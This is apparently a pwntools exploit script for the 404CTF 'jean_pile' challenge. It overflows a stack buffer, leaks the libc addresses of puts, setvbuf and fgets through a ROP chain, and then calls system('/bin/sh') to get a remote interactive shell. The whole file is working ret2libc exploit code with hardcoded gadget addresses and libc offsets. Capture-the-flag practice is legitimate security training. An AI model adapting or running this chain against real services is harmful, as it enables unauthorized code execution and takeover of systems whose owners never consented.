from pwn import *

context.binary = binary = ELF("./jean_pile")

offset = 40+8
pop_rdi_ret = 0x400b83
ret = 0x400b12
puts_plt = binary.plt.puts
puts_got = binary.got.puts
setvbuf_got = binary.got.setvbuf
fgets_got = binary.got.fgets
service = binary.sym["service"]

payload = b"".join([
        b"A"*offset,
        b"SAVEDRBP",
        p64(pop_rdi_ret),
        p64(puts_got),
        p64(puts_plt),
        p64(pop_rdi_ret),
        p64(setvbuf_got),
        p64(puts_plt),
        p64(pop_rdi_ret),
        p64(fgets_got),
        p64(puts_plt),
        p64(service),
        b"\n",
])


p = remote("challenges.404ctf.fr", 31957)
# p = process("./jean_pile")

input("Waiting for debugger...")
p.recv()
p.send(b"1\n")
p.recv()
p.send(payload)

output = p.recv()

puts_leak = output.split(b"\n")[0]
puts_leak = u64(puts_leak.ljust(8, b"\x00"))
setvbuf_leak = output.split(b'\n')[1]
setvbuf_leak = u64(setvbuf_leak.ljust(8, b"\x00"))
fgets_leak = output.split(b"\n")[2]
fgets_leak = u64(fgets_leak.ljust(8, b"\x00"))

print(hex(puts_leak), hex(setvbuf_leak), hex(fgets_leak), sep="\n")

system = puts_leak - 0x77980 + 0x4c490
shell = puts_leak - 0x77980 + 0x196031

libc = binary.libc
libc.address = puts_leak - libc.sym["puts"]
system2 = libc.sym["system"]
shell2 = next(libc.search(b"/bin/sh\00"))

print(hex(system2), hex(shell2))

# print(p64(shell))

payload = b"".join([
        b"A"*offset,
        b"SAVEDRBP",
        p64(ret),
        p64(pop_rdi_ret),
        p64(shell),
        p64(system),
        b"\n",
])

p.send(b"1\n")
p.recv()
p.send(payload)
p.interactive()
